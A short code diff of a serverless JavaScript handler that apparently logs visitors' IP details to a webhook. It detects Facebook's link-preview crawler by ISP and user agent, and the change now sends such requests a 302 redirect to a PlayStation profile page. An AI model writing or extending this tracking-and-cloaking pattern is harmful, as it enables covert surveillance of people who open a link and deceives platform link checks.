@@ -99,7 +99,8 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            return res.end(); // Stop further execution
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.end();
         } 
 
         if (ipDetails.isp === "Facebook, Inc." && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")) {
@@ -118,7 +119,8 @@ export default async function handler(req, res) {
                 ]
             };
             await sendToWebhook(message);
-            return res.end(); // Stop further execution
+            res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
+            res.end();
         }
 
         message = {
